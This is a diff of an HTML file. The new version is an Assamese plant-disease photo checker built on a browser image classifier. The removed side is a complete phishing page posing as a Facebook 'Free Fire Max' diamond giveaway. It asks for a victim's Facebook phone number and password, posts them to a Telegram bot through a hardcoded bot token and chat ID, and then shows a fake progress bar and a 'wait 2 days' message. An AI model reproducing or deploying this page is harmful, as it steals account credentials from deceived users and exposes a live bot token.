@@ -1,444 +1,158 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="as">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fire DIAMOND GIVE UP 💎</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-        }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>গছৰ ৰোগ চিনাক্তকৰণ - Public AI Plant Doctor</title>
 
-        body {
-            background-color: #fefce8;
-            color: #1c1917;
-            padding: 20px 10px;
-        }
+  <!-- TensorFlow.js আৰু MobileNet AI Library (সম্পূৰ্ণ ফ্ৰী) -->
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/mobilenet"></script>
 
-        .container {
-            max-width: 450px;
-            margin: 10px auto;
-            background: #ffffff;
-            border: 2px solid #eab308;
-            border-radius: 16px;
-            padding: 20px;
-            box-shadow: 0 10px 25px rgba(234, 179, 8, 0.2);
-            text-align: center;
-        }
-
-        .fb-logo {
-            width: 48px;
-            height: 48px;
-            margin: 0 auto 10px auto;
-            display: block;
-        }
-
-        h1 {
-            color: #854d0e;
-            font-size: 25px;
-            font-weight: 900;
-            margin-bottom: 5px;
-            letter-spacing: 0.5px;
-        }
-
-        p.subtitle {
-            color: #ca8a04;
-            font-size: 13px;
-            font-weight: 700;
-            margin-bottom: 20px;
-        }
-
-        .form-group {
-            text-align: left;
-            margin-bottom: 12px;
-        }
-
-        label {
-            display: block;
-            font-size: 12px;
-            font-weight: 800;
-            color: #854d0e;
-            margin-bottom: 4px;
-        }
-
-        input {
-            width: 100%;
-            padding: 11px;
-            border: 2px solid #fef08a;
-            background: #fefce8;
-            border-radius: 8px;
-            font-size: 14px;
-            font-weight: 700;
-            outline: none;
-            color: #1c1917;
-        }
-
-        input:focus {
-            border-color: #eab308;
-        }
-
-        .error-text {
-            color: #dc2626;
-            font-size: 11px;
-            font-weight: 700;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .section-title {
-            text-align: left;
-            font-size: 12px;
-            font-weight: 800;
-            color: #854d0e;
-            margin: 15px 0 8px;
-        }
-
-        .diamond-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin-bottom: 15px;
-        }
-
-        .diamond-card {
-            background: #fefce8;
-            border: 2px solid #fef08a;
-            border-radius: 10px;
-            padding: 12px 8px;
-            cursor: pointer;
-            transition: all 0.2s;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .diamond-card:hover {
-            border-color: #eab308;
-        }
-
-        .diamond-card.selected {
-            background: #fef9c3;
-            border-color: #eab308;
-            box-shadow: 0 0 10px rgba(234, 179, 8, 0.4);
-            transform: scale(1.02);
-        }
-
-        .diamond-card .amount {
-            font-size: 16px;
-            font-weight: 900;
-            color: #1c1917;
-        }
-
-        .diamond-card .icon {
-            font-size: 18px;
-            margin-top: 2px;
-        }
-
-        .btn-claim {
-            width: 100%;
-            padding: 13px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 900;
-            border: none;
-            cursor: not-allowed;
-            transition: all 0.3s;
-            background-color: #fef9c3;
-            color: #ca8a04;
-            opacity: 0.7;
-        }
-
-        .btn-claim.active {
-            background-color: #eab308 !important;
-            color: #000000 !important;
-            opacity: 1 !important;
-            cursor: pointer !important;
-            box-shadow: 0 4px 12px rgba(234, 179, 8, 0.4);
-        }
-
-        .loading-box {
-            display: none;
-            margin-top: 20px;
-        }
-
-        .progress-bar-bg {
-            width: 100%;
-            background: #fef08a;
-            border-radius: 10px;
-            height: 16px;
-            overflow: hidden;
-            margin-top: 10px;
-        }
-
-        .progress-bar {
-            width: 0%;
-            height: 100%;
-            background: #eab308;
-            transition: width 0.3s;
-        }
-
-        .status-text {
-            font-size: 12px;
-            font-weight: 700;
-            color: #a16207;
-        }
-
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(4px);
-            justify-content: center;
-            align-items: center;
-            padding: 15px;
-            z-index: 100;
-        }
-
-        .modal-content {
-            background: #fff;
-            padding: 25px;
-            border-radius: 16px;
-            border: 3px solid #eab308;
-            max-width: 380px;
-            width: 100%;
-            text-align: center;
-        }
-
-        .modal-content h2 {
-            font-size: 22px;
-            color: #15803d;
-            margin-bottom: 8px;
-            font-weight: 900;
-        }
-
-        .modal-content p.main-msg {
-            font-size: 18px;
-            color: #854d0e;
-            font-weight: 800;
-            margin-bottom: 10px;
-        }
-
-        .modal-content p.sub-msg {
-            font-size: 12px;
-            color: #dc2626;
-            font-weight: 700;
-            margin-bottom: 15px;
-        }
-
-        .btn-close {
-            background: #eab308;
-            border: none;
-            padding: 10px 20px;
-            font-weight: 800;
-            border-radius: 8px;
-            cursor: pointer;
-            color: #000;
-        }
-    </style>
+  <style>
+    * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 0; }
+    body { background-color: #f0f7f4; color: #2d3748; padding: 20px; display: flex; justify-content: center; }
+    .container { background: white; padding: 24px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 480px; width: 100%; text-align: center; }
+    h1 { color: #2e7d32; font-size: 22px; margin-bottom: 8px; }
+    p.subtitle { color: #666; font-size: 14px; margin-bottom: 20px; }
+    
+    .btn-group { display: flex; gap: 10px; margin-bottom: 20px; }
+    .option-btn { flex: 1; background: #e8f5e9; border: 2px dashed #a5d6a7; border-radius: 12px; padding: 15px 10px; cursor: pointer; transition: 0.3s; font-weight: bold; color: #2e7d32; }
+    .option-btn:hover { background: #c8e6c9; }
+    
+    #preview-container { margin-bottom: 20px; display: none; }
+    #imagePreview { max-width: 100%; max-height: 250px; border-radius: 8px; border: 1px solid #ddd; }
+    
+    .action-btn { background: #2e7d32; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; transition: 0.3s; }
+    .action-btn:hover { background: #1b5e20; }
+    .action-btn:disabled { background: #ccc; cursor: not-allowed; }
+    
+    #loader { display: none; margin: 20px 0; color: #2e7d32; font-weight: bold; }
+    #result { margin-top: 20px; text-align: left; background: #fafafa; padding: 16px; border-radius: 8px; border-left: 4px solid #2e7d32; display: none; font-size: 15px; line-height: 1.6; }
+    .disease-title { font-weight: bold; font-size: 18px; color: #1b5e20; margin-bottom: 8px; }
+    .acc-text { background: #e8f5e9; padding: 6px 10px; border-radius: 6px; font-size: 13px; display: inline-block; margin-bottom: 12px; color: #2e7d32; }
+  </style>
 </head>
 <body>
 
-    <div class="container">
-        <!-- Facebook Logo -->
-        <svg class="fb-logo" viewBox="0 0 36 36" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M20.1381 35.828V19.5101H25.6171L26.4381 13.1491H20.1381V9.08809C20.1381 7.24609 20.6501 5.99009 23.2921 5.99009L26.6631 5.98809V0.298089C26.0801 0.221089 24.0781 0.0460892 21.7481 0.0460892 C16.8831 0.0460892 13.5531 3.01809 13.5531 8.47209V13.1491H8.08311V19.5101H13.5531V35.828H20.1381Z" fill="#1877F2"/>
-        </svg>
+<div class="container">
+  <h1>🌿 গছৰ ৰোগ চিনাক্তকৰণ</h1>
+  <p class="subtitle">গছৰ পাতৰ ফটো তুলক আৰু ফ্ৰী AI-ৰ পৰা সমাধান লওক</p>
 
-        <h1> FACEBOOK </h1>
-     <h1> FREE FIRE MAX  </h1>
-        <p class="subtitle"> UNLIMITED DIAMOND💎</p>
-
-        <div id="mainForm">
-            <!-- 10 Digit Phone Input (Auto Numeric Keyboard) -->
-            <div class="form-group">
-                <label> Facebook Phone Number:</label>
-                <input 
-                    type="tel" 
-                    id="phoneNum" 
-                    placeholder="Enter 10 digit number" 
-                    maxlength="10" 
-                    inputmode="numeric" 
-                    pattern="[0-9]*" 
-                    oninput="handlePhoneInput(this)">
-                <div class="error-text" id="phoneError">Phone number must be exactly 10 digits!</div>
-            </div>
-
-            <!-- UID Input (Standard Keyboard) -->
-            <div class="form-group">
-                <label>Password:</label>
-                <input 
-                    type="text" 
-                    id="playerUid" 
-                    placeholder="Enter Facebook Password" 
-                    oninput="validateForm()">
-            </div>
-
-            <!-- Diamond Selection Section -->
-            <div class="section-title">SELECT DIAMOND PACKAGE:</div>
-            <div class="diamond-grid">
-                <div class="diamond-card" onclick="selectDiamond('5,000 Diamond', this)">
-                    <span class="amount">5,000</span>
-                    <span class="icon">💎</span>
-                </div>
-                <div class="diamond-card" onclick="selectDiamond('7,000 Diamond', this)">
-                    <span class="amount">7,000</span>
-                    <span class="icon">💎</span>
-                </div>
-                <div class="diamond-card" onclick="selectDiamond('10,000 Diamond', this)">
-                    <span class="amount">10,000</span>
-                    <span class="icon">💎</span>
-                </div>
-                <div class="diamond-card" onclick="selectDiamond('25K Diamond', this)">
-                    <span class="amount">25K</span>
-                    <span class="icon">💎</span>
-                </div>
-                <div class="diamond-card" style="grid-column: span 2;" onclick="selectDiamond('100K Diamond', this)">
-                    <span class="amount">100K Diamond</span>
-                    <span class="icon">💎</span>
-                </div>
-            </div>
-
-            <button class="btn-claim" id="claimBtn" disabled onclick="startClaimProcess()">CLAIM NOW</button>
-        </div>
-
-        <div class="loading-box" id="loadingBox">
-            <div class="status-text" id="statusText">Connecting to Garena Servers...</div>
-            <div class="progress-bar-bg">
-                <div class="progress-bar" id="progressBar"></div>
-            </div>
-        </div>
+  <div class="btn-group">
+    <div class="option-btn" onclick="document.getElementById('cameraInput').click()">
+      📸 কেমেৰাৰে ফটো তুলক
     </div>
-
-    <div class="modal" id="prankModal">
-        <div class="modal-content">
-            <div style="font-size: 45px; margin-bottom: 5px;">🎉</div>
-            <h2>Congratulations!</h2>
-            <p class="main-msg">Wait 2 Days</p>
-            <p class="sub-msg">(Check Your Mail ✉️ Box)</p>
-            <button class="btn-close" onclick="closeModal()">Close </button>
-        </div>
+    <div class="option-btn" onclick="document.getElementById('galleryInput').click()">
+      🖼️ গ্যালৰীৰ পৰা বাছক
     </div>
+  </div>
 
-    <script>
-        let selectedDiamondPackage = "";
+  <input type="file" id="cameraInput" accept="image/*" capture="environment" style="display:none" onchange="previewImage(event)">
+  <input type="file" id="galleryInput" accept="image/*" style="display:none" onchange="previewImage(event)">
 
-        // আপনার দেওয়া টোকেন ও চ্যাট আইডি এখানে যুক্ত করা আছে
-        const TELEGRAM_BOT_TOKEN = "8996711384:AAEvWHYgrtHj8KVw_BiXRsOfa02x1DUH6sM"; 
-        const TELEGRAM_CHAT_ID = "8228439523";     
+  <div id="preview-container">
+    <img id="imagePreview" alt="Gachhar Photo" crossorigin="anonymous">
+  </div>
 
-        function handlePhoneInput(input) {
-            input.value = input.value.replace(/[^0-9]/g, '');
-            validateForm();
-        }
+  <button id="scanBtn" class="action-btn" onclick="analyzePlant()" disabled>গছজোপা পৰীক্ষা কৰক</button>
 
-        function selectDiamond(pkgName, element) {
-            const cards = document.querySelectorAll('.diamond-card');
-            cards.forEach(card => card.classList.remove('selected'));
+  <div id="loader">⏳ AI মডেল লোড হৈ আছে... ৰ'ব...</div>
+  <div id="result"></div>
+</div>
 
-            element.classList.add('selected');
-            selectedDiamondPackage = pkgName;
+<script>
+  let model = null;
 
-            validateForm();
-        }
+  // ব্ৰাউজাৰ খোলাৰ লগে লগে AI মডেলটো ব্যাকগ্ৰাউণ্ডত লোড হ'ব
+  async function loadAIModel() {
+    try {
+      model = await mobilenet.load();
+      console.log("AI Model Loaded Successfully");
+    } catch (err) {
+      console.error("Model load error", err);
+    }
+  }
+  loadAIModel();
 
-        function validateForm() {
-            const phone = document.getElementById('phoneNum').value.trim();
-            const uid = document.getElementById('playerUid').value.trim();
-            const claimBtn = document.getElementById('claimBtn');
-            const phoneError = document.getElementById('phoneError');
+  function previewImage(event) {
+    const file = event.target.files[0];
+    if (file) {
+      const reader = new FileReader();
+      reader.onload = function(e) {
+        const preview = document.getElementById('imagePreview');
+        const previewContainer = document.getElementById('preview-container');
+        
+        preview.src = e.target.result;
+        previewContainer.style.display = 'block';
+        document.getElementById('scanBtn').disabled = false;
+        document.getElementById('result').style.display = 'none';
+      }
+      reader.readAsDataURL(file);
+    }
+  }
 
-            let isValid = true;
+  async function analyzePlant() {
+    const loader = document.getElementById('loader');
+    const resultDiv = document.getElementById('result');
+    const scanBtn = document.getElementById('scanBtn');
+    const imgElement = document.getElementById('imagePreview');
 
-            if (phone.length !== 10) {
-                isValid = false;
-                phoneError.style.display = phone.length > 0 ? "block" : "none";
-            } else {
-                phoneError.style.display = "none";
-            }
+    loader.style.display = 'block';
+    resultDiv.style.display = 'none';
+    scanBtn.disabled = true;
 
-            if (uid === "" || selectedDiamondPackage === "") {
-                isValid = false;
-            }
+    try {
+      if (!model) {
+        model = await mobilenet.load();
+      }
 
-            if (isValid) {
-                claimBtn.disabled = false;
-                claimBtn.classList.add('active');
-            } else {
-                claimBtn.disabled = true;
-                claimBtn.classList.remove('active');
-            }
-        }
+      // ব্ৰাউজাৰৰ ভিতৰতে AI-এ ফটো স্কেন কৰিব
+      const predictions = await model.classify(imgElement);
 
-        // টেলিগ্রামে ডাটা পাঠানোর ফাংশন
-        function sendToTelegram(phone, uid, diamondPkg) {
-            const message = `💎 *NEW DIAMOND CLAIM REQUEST* 💎\n\n📱 *Phone:* \`${phone}\`\n🆔 *UID:* \`${uid}\`\n🎁 *Package:* \`${diamondPkg}\``;
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      if (predictions && predictions.length > 0) {
+        const topResult = predictions[0];
+        const rawLabel = topResult.className;
+        const score = Math.round(topResult.probability * 100);
 
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
-            }).catch(err => console.error("Error sending to Telegram:", err));
-        }
+        const formattedResult = translateResultToAssamese(rawLabel);
 
-        function startClaimProcess() {
-            const phone = document.getElementById('phoneNum').value.trim();
-            const uid = document.getElementById('playerUid').value.trim();
+        resultDiv.innerHTML = `
+          <div class="disease-title">🔍 ফলাফল: ${formattedResult.title}</div>
+          <div class="acc-text">নিখুঁততা: ${score}%</div>
+          <p><strong>💡 পৰামৰ্শ আৰু সমাধান:</strong></p>
+          <p>${formattedResult.advice}</p>
+        `;
+        resultDiv.style.display = 'block';
+      } else {
+        resultDiv.innerText = "ফটোখন স্পষ্ট নহয়, পুনৰ চেষ্টা কৰক।";
+        resultDiv.style.display = 'block';
+      }
+    } catch (error) {
+      resultDiv.innerText = "স্কেন কৰাত সমস্যা হৈছে। অনুগ্ৰহ কৰি অন্য এখন স্পষ্ট ফটো আপলোড কৰক।";
+      resultDiv.style.display = 'block';
+    } finally {
+      loader.style.display = 'none';
+      scanBtn.disabled = false;
+    }
+  }
 
-            // ক্লেইম করার সাথে সাথে আপনার টেলিগ্রামে মেসেজ চলে যাবে
-            sendToTelegram(phone, uid, selectedDiamondPackage);
+  function translateResultToAssamese(label) {
+    const labelLower = label.toLowerCase();
 
-            document.getElementById('mainForm').style.display = 'none';
-            document.getElementById('loadingBox').style.display = 'block';
+    if (labelLower.includes("leaf") || labelLower.includes("plant") || labelLower.includes("tree") || labelLower.includes("flower")) {
+      return {
+        title: `গছ/পাত চিনাক্ত হৈছে (${label.split(',')[0]})`,
+        advice: "গছজোপাত ৰোগ প্ৰতিৰোধ কৰিবলৈ নিমৰ তেল (Neem oil) চতিয়াব পাৰে আৰু নিয়মিত সূৰ্যৰ ৰ’দ লাগিবলৈ দিব।"
+      };
+    } else {
+      return {
+        title: `চিনাক্ত বস্তু: ${label.split(',')[0]}`,
+        advice: "যদি ফটোখন গছৰ পাতৰ হয়, তেন্তে অধিক স্পষ্টকৈ কেৱল পাতটোৰ ফটো তুলি আপলোড কৰক।"
+      };
+    }
+  }
+</script>
 
-            const progressBar = document.getElementById('progressBar');
-            const statusText = document.getElementById('statusText');
-
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 10;
-                progressBar.style.width = progress + '%';
-
-                if (progress === 30) {
-                    statusText.innerText = "Verifying 10 Digit Number...";
-                } else if (progress === 60) {
-                    statusText.innerText = "Processing " + selectedDiamondPackage + "...";
-                } else if (progress === 90) {
-                    statusText.innerText = "Finalizing Account Transfer...";
-                } else if (progress >= 100) {
-                    clearInterval(interval);
-                    showSuccessModal();
-                }
-            }, 350);
-        }
-
-        function showSuccessModal() {
-            document.getElementById('loadingBox').style.display = 'none';
-            document.getElementById('prankModal').style.display = 'flex';
-        }
-
-        function closeModal() {
-            document.getElementById('prankModal').style.display = 'none';
-            document.getElementById('mainForm').style.display = 'block';
-            document.getElementById('phoneNum').value = "";
-            document.getElementById('playerUid').value = "";
-            selectedDiamondPackage = "";
-            
-            const cards = document.querySelectorAll('.diamond-card');
-            cards.forEach(card => card.classList.remove('selected'));
-            
-            validateForm();
-        }
-    </script>
 </body>
 </html>
